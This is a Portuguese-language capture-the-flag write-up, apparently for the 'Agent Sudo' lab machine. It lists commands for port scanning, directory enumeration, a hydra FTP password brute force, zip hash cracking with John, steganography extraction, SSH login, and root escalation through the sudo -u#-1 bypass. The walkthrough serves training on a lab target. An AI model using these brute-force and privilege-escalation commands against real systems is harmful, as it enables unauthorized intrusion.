# Agent-Sudo

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.20.48
```

![image](https://github.com/lufffe/Writeups/assets/90646635/cd3568d5-c517-4d16-9d14-a72a6a77943b)


![image](https://github.com/lufffe/Writeups/assets/90646635/f394bbd5-c321-478c-9931-506790ea7383)


* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 21,22,80 10.10.20.48
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4c62a143-6d89-4fe2-8ffb-2ba7da07a262)

* ### Olhando no http
  
![image](https://github.com/lufffe/Writeups/assets/90646635/589e6c75-6ab2-46c1-a20e-c991c03bc289)


```bash
curl -A "C" -L 10.10.224.108
```
![image](https://github.com/lufffe/Writeups/assets/90646635/de62aa42-e5d5-4322-b7d2-6cef17f7d6e5)

* ###  Scan de Arquivos e Diretórios.
```bash
gobuster dir -u http://10.10.20.48 -w directory-list-2.3-small.txt -t 100 --no-error
```

* ### Bruteforce no FTP
```bash
hydra -l chris -P ~/rockyou.txt ftp://10.10.20.48
```

![image](https://github.com/lufffe/Writeups/assets/90646635/59be2048-e06f-4409-92e1-5182a28763e7)

* ### Acessando o FTP.
```bash
ftp 10.10.20.48
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e3b8c8f2-4606-482e-a2d0-fba0f607b853)


```bash
binwalk -e cutie.png
```
![image](https://github.com/lufffe/Writeups/assets/90646635/9e894823-400d-44d9-af12-e80691915f8a)

```bash
zip2john 8702.zip > hash.txt 
```

```bash
john --wordlist=~/rockyou.txt hash.txt
```

![image](https://github.com/lufffe/Writeups/assets/90646635/ca6362d6-01f4-47fb-bef1-96a9ca9afd71)

 
```bash
7z x 8702.zip 
```
![image](https://github.com/lufffe/Writeups/assets/90646635/67030a0b-8f9b-472a-bb11-c8d73fe80f07)

```bash
cat To_agentR.txt 
```
![image](https://github.com/lufffe/Writeups/assets/90646635/d59d51b8-dce2-4e9b-84e8-9641c2ebcc9f)


![image](https://github.com/lufffe/Writeups/assets/90646635/e3d6aa92-6bbd-48b6-a641-378aa139910b)

```bash
steghide extract -sf cute-alien.jpg
```

![image](https://github.com/lufffe/Writeups/assets/90646635/5aa953fc-08b7-4af4-9326-f9bb0297ae44)



```Bash
cat message.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/86e61009-c530-4622-8d1b-9a93bd9486ff)

```Bash
ssh james@10.10.20.48
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f488accb-48ed-496f-b3af-e55bcee36c0e)

* ### Flag User.
```bash
cat user_flag.txt
```

```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/43eff9af-ea8b-4d66-8f8d-a7f6f6653bda)

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
```
![image](https://github.com/lufffe/Writeups/assets/90646635/8607e831-f124-42bf-aab4-2662af23ffdc)

* ### Flag Root.
```bash
cat /root/root.txt
```
